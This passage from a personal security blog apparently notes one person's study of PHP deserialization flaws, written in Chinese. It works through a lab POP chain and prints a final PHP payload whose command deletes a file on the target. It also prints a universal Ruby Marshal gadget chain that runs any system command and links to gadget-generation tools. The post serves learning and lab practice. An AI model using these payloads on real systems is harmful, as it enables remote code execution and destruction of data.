+<p>首先，這個網站的cookie是會經過php反序列的，所以先去尋找<code>__wakeup</code>的magic出現在哪?  </p>
+<p>答案就是<code>CustomTemplate</code>，然後<code>__wakeup</code>會去觸發它裡面的<code>build_product()</code>函數：  </p>
+<p>再來觀察哪個class帶有弱點，會發現<code>DefaultMap</code>的<code>__get</code>magic有個<code>call_user_func($this-&gt;callback, $name);</code>的段落，而<code>call_user_func</code>這個函數在php裡面可以以字串的方式去呼叫函數&#x2F;參數。  </p>
+<p>官方網站解釋：<a target="_blank" rel="noopener" href="https://php.golaravel.com/function.call-user-func.html">https://php.golaravel.com/function.call-user-func.html</a>  </p>
+<p>而這題的目標是執行<code>rm /home/carlos/morale.txt</code>，所以可以利用：   </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;rm /home/carlos/morale.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>達成目標。<br>仔細觀察<code>DefaultMap</code>的段落：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;callback = <span class="variable">$callback</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;callback, <span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果希望執行<code>call_user_func(&#39;exec&#39;, &#39;rm /home/carlos/morale.txt&#39;);</code>，有兩點：<br>1.必須能呼叫到<code>__get</code>，也就是有人去存取那個物件的<code>callback</code> attribute<br>2.必須使<code>name</code>&#x3D;<code>&#39;rm /home/carlos/morale.txt&#39;</code>而且那個<code>DefaultMap</code>物件的<code>callback</code>當下等於<code>&#39;exec&#39;</code>。<br>再回去觀察一次<code>CustomTemplate</code>的<code>build_product()</code>函數</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">build_product</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;product = <span class="keyword">new</span> <span class="title class_">Product</span>(<span class="variable language_">$this</span>-&gt;default_desc_type, <span class="variable language_">$this</span>-&gt;desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>發現它會建立一個<code>Product</code>物件，去看看<code>Product</code>的內容：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default_desc_type</span>, <span class="variable">$desc</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;desc = <span class="variable">$desc</span>-&gt;<span class="variable">$default_desc_type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果把<code>desc</code>變成<code>DefaultMap</code>物件，那就可以透過<code>__construct</code>去呼叫<code>DefaultMap</code>的<code>&#39;rm /home/carlos/morale.txt&#39;</code>attribute(當然，它不存在，但前面說過不存在的也會通過<code>__get</code>)，最後再把<code>DefaultMap</code>的<code>callback</code>預設成<code>&#39;exec&#39;</code>就可以完成剛剛的RCE規劃了!<br><strong>FINAL PAYLOAD:</strong>  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$default_desc_type</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$desc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DefaultMap</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callback</span>=<span class="string">&quot;exec&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="keyword">new</span> <span class="title class_">CustomTemplate</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;default_desc_type=<span class="string">&quot;rm /home/carlos/morale.txt&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span>-&gt;desc=<span class="keyword">new</span> <span class="title class_">DefaultMap</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>)));</span><br></pre></td></tr></table></figure>
+<p>我還有看到一個不錯的範例在：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120297881">https://blog.csdn.net/cosmoslin/article/details/120297881</a>  </p>
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h2><p>在php中有許多奇奇怪怪的協議，像是LFI時可以利用的<code>php://</code>協議，而在php中<code>phar://</code>的協議可以把那個檔案當作php phar的物件反序列化一次。<br>Github Repo：<a target="_blank" rel="noopener" href="https://github.com/kunte0/phar-jpg-polyglot/tree/master">https://github.com/kunte0/phar-jpg-polyglot/tree/master</a>  </p>
+<h2 id="同場加映"><a href="#同場加映" class="headerlink" title="同場加映"></a>同場加映</h2><p>不只php有反序列化的洞，而因為這些套件現在都是互相用來用去的所以其實有很多別人整理好的gadget  </p>
+<h3 id="phpgcc"><a href="#phpgcc" class="headerlink" title="phpgcc"></a>phpgcc</h3><p>打現存的php套件的POP CHAIN生成工具  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a>  </p>
+<h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>JAVA 現存反序列化攻擊PAYLOAD們<br><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br>P.S. KALI LINUX上面的debug方式<br>調回去java11，前面接上：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+<p>後面再打<code>jar ......</code><br>疑似<strong>CommonsCollections</strong>那一系列比較容易過(?)  </p>
+<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>把<code>rs.instance_variable_set(&#39;@git_set&#39;, &quot;id&quot;)</code>那行第二個參數的id換成想要的command<br>然後丟去<a target="_blank" rel="noopener" href="https://www.onlinegdb.com/online_ruby_compiler">onlinegdb</a>跑<br>來源：<a target="_blank" rel="noopener" href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a><br>好像2.X~3.X都能打，挺萬能的(?  </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Autoload the required classes</span></span><br><span class="line"><span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:SpecFetcher</span></span><br><span class="line"><span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Installer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prevent the payload from running when we Marshal.dump it</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Gem</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Requirement</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">marshal_dump</span></span><br><span class="line">      [<span class="variable">@requirements</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">wa1 = <span class="title class_">Net::WriteAdapter</span>.new(<span class="title class_">Kernel</span>, <span class="symbol">:system</span>)</span><br><span class="line"></span><br><span class="line">rs = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:RequestSet</span>.allocate</span><br><span class="line">rs.instance_variable_set(<span class="string">&#x27;@sets&#x27;</span>, wa1)</span><br><span class="line">rs.instance_variable_set(<span class="string">&#x27;@git_set&#x27;</span>, <span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">wa2 = <span class="title class_">Net::WriteAdapter</span>.new(rs, <span class="symbol">:resolve</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Package</span><span class="symbol">:</span><span class="symbol">:TarReader</span><span class="symbol">:</span><span class="symbol">:Entry</span>.allocate</span><br><span class="line">i.instance_variable_set(<span class="string">&#x27;@read&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">i.instance_variable_set(<span class="string">&#x27;@header&#x27;</span>, <span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="title class_">Net</span><span class="symbol">:</span><span class="symbol">:BufferedIO</span>.allocate</span><br><span class="line">n.instance_variable_set(<span class="string">&#x27;@io&#x27;</span>, i)</span><br><span class="line">n.instance_variable_set(<span class="string">&#x27;@debug_output&#x27;</span>, wa2)</span><br><span class="line"></span><br><span class="line">t = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Package</span><span class="symbol">:</span><span class="symbol">:TarReader</span>.allocate</span><br><span class="line">t.instance_variable_set(<span class="string">&#x27;@io&#x27;</span>, n)</span><br><span class="line"></span><br><span class="line">r = <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Requirement</span>.allocate</span><br><span class="line">r.instance_variable_set(<span class="string">&#x27;@requirements&#x27;</span>, t)</span><br><span class="line"></span><br><span class="line">payload = <span class="title class_">Marshal</span>.dump([<span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:SpecFetcher</span>, <span class="title class_">Gem</span><span class="symbol">:</span><span class="symbol">:Installer</span>, r])</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;base64&quot;</span></span><br><span class="line">puts <span class="title class_">Base64</span>.encode64(payload)</span><br></pre></td></tr></table></figure>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>今天好累，我改天會去看防護和繞過防護的方法orz<br>我還要多練習&gt;&lt;</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-class"><span class="toc-number">2.</span> <span class="toc-text">php class</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Magic-Methods"><span class="toc-number">3.</span> <span class="toc-text">Magic Methods</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct"><span class="toc-number">3.1.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">3.2.</span> <span class="toc-text">__get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set"><span class="toc-number">3.3.</span> <span class="toc-text">__set</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">3.4.</span> <span class="toc-text">__invoke</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-NaN"><span class="toc-number">3.5.</span> <span class="toc-text">__toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup"><span class="toc-number">3.6.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-number">3.7.</span> <span class="toc-text">__sleep</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Serialization-Unserialization"><span class="toc-number">4.</span> <span class="toc-text">Serialization&#x2F;Unserialization</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP-Chain"><span class="toc-number">5.</span> <span class="toc-text">POP Chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar"><span class="toc-number">6.</span> <span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E5%A0%B4%E5%8A%A0%E6%98%A0"><span class="toc-number">7.</span> <span class="toc-text">同場加映</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpgcc"><span class="toc-number">7.1.</span> <span class="toc-text">phpgcc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ysoserial"><span class="toc-number">7.2.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ruby"><span class="toc-number">7.3.</span> <span class="toc-text">Ruby</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">8.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/04/03/php-serial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/04/03/php-serial/&text=PHP Serialization Vulns Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/04/03/php-serial/&is_video=false&description=PHP Serialization Vulns Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP Serialization Vulns Note&body=Check out this article: http://wha13.github.io/2024/04/03/php-serial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/04/03/php-serial/&title=PHP Serialization Vulns Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/04/03/php-serial/&name=PHP Serialization Vulns Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/04/03/php-serial/&t=PHP Serialization Vulns Note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
